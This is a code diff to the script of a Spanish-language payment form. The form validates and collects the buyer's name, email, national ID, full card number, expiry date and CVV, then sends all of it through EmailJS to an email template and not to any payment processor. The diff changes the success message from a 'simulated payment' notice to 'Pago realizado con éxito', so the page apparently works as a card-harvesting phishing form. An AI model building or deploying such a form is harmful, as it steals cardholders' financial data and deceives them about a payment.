@@ -238,15 +238,11 @@
     const message = document.getElementById('message');
     const btnEnviar = document.getElementById('btnEnviar');
 
-    // Validación de campos
     function validate() {
       let valid = true;
-
-      // Helpers
       const showError = (id) => document.getElementById(id).classList.add('active');
       const hideError = (id) => document.getElementById(id).classList.remove('active');
 
-      // Monto
       const monto = form.monto.value.trim();
       if (!monto || isNaN(monto) || Number(monto) <= 0) {
         showError('error-monto');
@@ -255,7 +251,6 @@
         hideError('error-monto');
       }
 
-      // Tipo tarjeta
       if (![...form.tipoTarjeta].some(r => r.checked)) {
         showError('error-tipoTarjeta');
         valid = false;
@@ -263,7 +258,6 @@
         hideError('error-tipoTarjeta');
       }
 
-      // Nombre
       if (!form.nombre.value.trim()) {
         showError('error-nombre');
         valid = false;
@@ -271,37 +265,29 @@
         hideError('error-nombre');
       }
 
-      // Email
-      const email = form.email.value.trim();
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      if (!emailRegex.test(email)) {
+      if (!form.email.value.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email.value)) {
         showError('error-email');
         valid = false;
       } else {
         hideError('error-email');
       }
 
-      // DNI
-      const dni = form.dni.value.trim();
-      const dniRegex = /^\d{6,10}$/;
-      if (!dniRegex.test(dni)) {
+      if (!/^\d{6,10}$/.test(form.dni.value.trim())) {
         showError('error-dni');
         valid = false;
       } else {
         hideError('error-dni');
       }
 
-      // Tarjeta (solo números y espacios, 13-19 dígitos)
-      let tarjeta = form.tarjeta.value.replace(/\s+/g, '');
-      const tarjetaRegex = /^\d{13,19}$/;
-      if (!tarjetaRegex.test(tarjeta)) {
+      // Validar número de tarjeta: 13 a 19 dígitos, puede tener espacios
+      let tarjetaVal = form.tarjeta.value.replace(/\s+/g, '');
+      if (!/^\d{13,19}$/.test(tarjetaVal)) {
         showError('error-tarjeta');
         valid = false;
       } else {
         hideError('error-tarjeta');
       }
 
-      // Titular
       if (!form.titular.value.trim()) {
         showError('error-titular');
         valid = false;
@@ -309,23 +295,18 @@
         hideError('error-titular');
       }
 
-      // Vencimiento MM/AA
+      // Validar fecha MM/AA y que no esté expirada
       const venc = form.vencimiento.value.trim();
-      const vencRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
-      if (!vencRegex.test(venc)) {
+      if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(venc)) {
         showError('error-vencimiento');
         valid = false;
       } else {
-        // Verificar si fecha no está vencida
+        // Verificar que la fecha no sea pasada
         const [mes, anio] = venc.split('/');
-        const fechaExp = new Date(
-          2000 + parseInt(anio, 10),
-          parseInt(mes, 10) - 1,
-          1
-        );
-        const hoy = new Date();
-        hoy.setDate(1);
-        if (fechaExp < hoy) {
+        const ahora = new Date();
+        const añoActual = ahora.getFullYear() % 100; // últimos 2 dígitos
+        const mesActual = ahora.getMonth() + 1;
+        if (parseInt(anio) < añoActual || (parseInt(anio) === añoActual && parseInt(mes) < mesActual)) {
           showError('error-vencimiento');
           valid = false;
         } else {
@@ -333,10 +314,8 @@
         }
       }
 
-      // CVV (3 o 4 dígitos)
-      const cvv = form.cvv.value.trim();
-      const cvvRegex = /^\d{3,4}$/;
-      if (!cvvRegex.test(cvv)) {
+      // Validar CVV 3 o 4 dígitos
+      if (!/^\d{3,4}$/.test(form.cvv.value.trim())) {
         showError('error-cvv');
         valid = false;
       } else {
@@ -346,54 +325,34 @@
       return valid;
     }
 
-    // Formatear número de tarjeta al escribir (agrega espacios cada 4 números)
-    const tarjetaInput = form.tarjeta;
-    tarjetaInput.addEventListener('input', (e) => {
-      let val = e.target.value.replace(/\D/g, '').substring(0,19);
-      let formatted = val.match(/.{1,4}/g);
-      if (formatted) e.target.value = formatted.join(' ');
-      else e.target.value = '';
-    });
-
-    // Formatear vencimiento MM/AA
-    const vencInput = form.vencimiento;
-    vencInput.addEventListener('input', (e) => {
-      let val = e.target.value.replace(/\D/g, '').substring(0,4);
-      if (val.length >= 3) {
-        val = val.substring(0,2) + '/' + val.substring(2);
-      }
-      e.target.value = val;
-    });
-
-    form.addEventListener('submit', function (e) {
+    form.addEventListener('submit', (e) => {
       e.preventDefault();
       message.textContent = '';
-      if (!validate()) return;
+      if (!validate()) {
+        return;
+      }
 
       btnEnviar.disabled = true;
       loader.classList.add('active');
 
-      // Obtener tipo de tarjeta seleccionado
       const tipoTarjeta = [...form.tipoTarjeta].find(r => r.checked).value;
-
-      // Preparar datos para EmailJS
       const templateParams = {
         nombre: form.nombre.value.trim(),
         email: form.email.value.trim(),
         dni: form.dni.value.trim(),
-        monto: form.monto.value.trim(),
-        tipo_tarjeta: tipoTarjeta,
         tarjeta: form.tarjeta.value.trim(),
         titular: form.titular.value.trim(),
         vencimiento: form.vencimiento.value.trim(),
-        cvv: form.cvv.value.trim()
+        cvv: form.cvv.value.trim(),
+        monto: form.monto.value.trim(),
+        tipoTarjeta: tipoTarjeta
       };
 
       emailjs.send('service_6pbv86h', 'template_m3nuw4p', templateParams)
         .then(() => {
           loader.classList.remove('active');
           message.style.color = '#a6f1a6';
-          message.textContent = 'Pago simulado enviado correctamente. Revisa tu correo.';
+          message.textContent = 'Pago realizado con éxito.';
           form.reset();
           btnEnviar.disabled = false;
         }, (error) => {
@@ -403,6 +362,35 @@
           btnEnviar.disabled = false;
           console.error('EmailJS error:', error);
         });
+    });
+
+    // Para mejor experiencia, formatea el número de tarjeta con espacios cada 4 dígitos
+    const tarjetaInput = form.tarjeta;
+    tarjetaInput.addEventListener('input', (e) => {
+      let valor = e.target.value.replace(/\D/g, '').substring(0, 19);
+      let partes = [];
+      for (let i = 0; i < valor.length; i += 4) {
+        partes.push(valor.substring(i, i + 4));
+      }
+      e.target.value = partes.join(' ');
+    });
+
+    // Formato para la fecha MM/AA
+    const vencimientoInput = form.vencimiento;
+    vencimientoInput.addEventListener('input', (e) => {
+      let valor = e.target.value.replace(/\D/g, '').substring(0, 4);
+      if (valor.length >= 3) {
+        valor = valor.substring(0,2) + '/' + valor.substring(2);
+      }
+      e.target.value = valor;
+    });
+
+    // Solo permitir números en CVV y DNI
+    form.cvv.addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '').substring(0,4);
+    });
+    form.dni.addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '').substring(0,10);
     });
   </script>
 </body>
